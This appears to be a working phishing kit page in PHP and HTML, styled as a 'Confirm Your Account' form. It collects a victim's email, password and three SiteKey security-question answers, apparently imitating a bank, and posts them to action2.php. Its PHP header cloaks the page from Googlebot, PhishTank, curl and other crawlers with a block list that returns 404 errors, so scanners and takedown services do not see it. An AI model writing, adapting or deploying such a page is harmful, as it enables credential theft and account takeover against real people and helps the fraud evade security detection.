<?php
/***
 *      _____         _    _     __   __
 *     |  __ \       | |  | |    \ \ / /
 *     | |  | |_ __  | |__| | ___ \ V / 
 *     | |  | | '__| |  __  |/ _ \ > <  
 *     | |__| | |    | |  | |  __// . \ 
 *     |_____/|_|    |_|  |_|\___/_/ \_\
 *                                        
 *                                      
 */
 error_reporting(0);
  include ('config.php');
  	// require '../prevents/anti1.php';
	// require '../prevents/anti2.php';
	// require '../prevents/anti3.php';
	// require '../prevents/anti4.php';
	// require '../prevents/anti5.php';
	// require '../prevents/anti6.php';
	// require '../prevents/anti7.php';
	// require '../prevents/anti8.php';
include('get_browser.php');
$ip = $_SERVER['REMOTE_ADDR'];
//----------------------------------------------------------------------------------------------------------------//
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'orange',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
		'phishtank',
		'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 404 Not Found'); 
    echo "HTTP/1.0 404 Not Found";
    exit();
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style>

.form-control {
display: block;
width: 100%;
height: 34px;
padding: 6px 12px;
font-size: 15px;
line-height: 1.42857143;
color: #555;
background-color: #fff;
background-image: none;
border: 1px solid #ccc;
border-radius: 4px;
-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
-webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
-o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
}

</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1447px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">

<form action=action2.php name=chalbhai id=chalbhai method=post>
<div id="image1" style="position:absolute; overflow:hidden; left:212px; top:0px; width:251px; height:69px; z-index:0"><img src="images/log.png" alt="" title="" border=0 width=251 height=69></div>

<div id="image2" style="position:absolute; overflow:hidden; left:215px; top:74px; width:987px; height:58px; z-index:1"><img src="images/1.png" alt="" title="" border=0 width=987 height=58></div>

<div id="image3" style="position:absolute; overflow:hidden; left:223px; top:98px; width:436px; height:78px; z-index:2"><img src="images/2.png" alt="" title="" border=0 width=436 height=78></div>

<div id="image9" style="position:absolute; overflow:hidden; left:221px; top:381px; width:905px; height:49px; z-index:3"><img src="images/8.png" alt="" title="" border=0 width=905 height=49></div>

<div id="image11" style="position:absolute; overflow:hidden; left:212px; top:795px; width:967px; height:18px; z-index:4"><img src="images/SSSSSSS.png" alt="" title="" border=0 width=967 height=18></div>

<div id="image12" style="position:absolute; overflow:hidden; left:202px; top:933px; width:1043px; height:362px; z-index:5"><img src="images/footer.png" alt="" title="" border=0 width=1043 height=362></div>

<select name="formselect8"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   style="position:absolute;left:399px;top:442px;width:388px;z-index:6">
<option value="Select SiteKey Challenge Question 1">Select SiteKey Challenge Question 1</option>
<option>what is the first name of your mothers closest friend </option>
<option>what was the name of your first pet </option>
<option>what is the first name of your favorite niece/nephew</option>
<option>what is the first name your hairdresserr/barber</option>
<option>what is the name of your best childhood friend </option>
<option>on what street is your grocery store</option>
<option>what is the name of the medical professional who delivered your first child</option>
<option>what is the name of a college you applied to but didnt atted </option>
<option>what was the first name of your favorite teacher or professor</option>
<option>what is your all-time favorite song </option>
</select>
<input name="formtext18"   required title="Please Enter Right Value" autocomplete="off" class="form-control"  type="text" style="position:absolute;width:388px;left:398px;top:485px;z-index:7">
<select name="formselect9"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   style="position:absolute;left:398px;top:528px;width:388px;z-index:8">
<option value="Select SiteKey Challenge Question 2">Select SiteKey Challenge Question 2</option>
<option>what is the first name of your high school prom date</option>
<option>who is your favorite person in history</option>
<option>what was the make and model of your first car </option>
<option>what is first name of best man/main of honor at your wedding </option>
<option>what is the name of your favorite restaurant</option>
<option>as a child what did you want to be when you grew up </option>
<option>what was the first live concert you attended</option>
<option>what was the first name of your first manager</option>
<option>what is the name of your high school star athlete</option>
<option>where were you on New Years 2000 </option></select>
<input name="formtext19"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" style="position:absolute;width:388px;left:398px;top:569px;z-index:9">
<select name="formselect10"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   style="position:absolute;left:398px;top:616px;width:388px;z-index:10">
<option value="Select SiteKey Challenge Question 3">Select SiteKey Challenge Question 3</option>
<option>what street did your best friend ih high school live on</option>
<option>what was the name of your first boyfriend or girlfriend</option>
<option>what is your best friend first name </option>
<option>what is the last name of your third grade teacher</option>
<option>what is the last name of your family physician</option>
<option>in what city did you honeymoon</option>
<option>in what city did you meet your spouse/significant other</option>
<option>what celebrity do you most resemble</option>
<option>what is the name of your favorite charity</option>
<option>what is the name of your first babysitter</option></select>
<input name="formtext20"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" style="position:absolute;width:388px;left:398px;top:657px;z-index:11">
<div id="formimage1" style="position:absolute; left:750px; top:850px; z-index:12"><input type="image" name="formimage1" width="179" height="35" src="images/contu.png"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:224px; top:435px; width:146px; height:261px; z-index:13"><img src="images/89546.png" alt="" title="" border=0 width=146 height=261></div>

<div id="image4" style="position:absolute; overflow:hidden; left:248px; top:274px; width:127px; height:85px; z-index:14"><img src="images/369852.png" alt="" title="" border=0 width=127 height=85></div>

<input name="formtext1"  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required  title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" style="position:absolute;width:350px;left:399px;top:284px;z-index:15">
<input name="formtext2"   required title="Please Enter Right Value" autocomplete="off" class="form-control"  type="password" style="position:absolute;width:350px;left:398px;top:324px;z-index:16">
<div id="image5" style="position:absolute; overflow:hidden; left:217px; top:195px; width:905px; height:49px; z-index:17"><img src="images/8.png" alt="" title="" border=0 width=905 height=49></div>

</div>

</body>
</html>
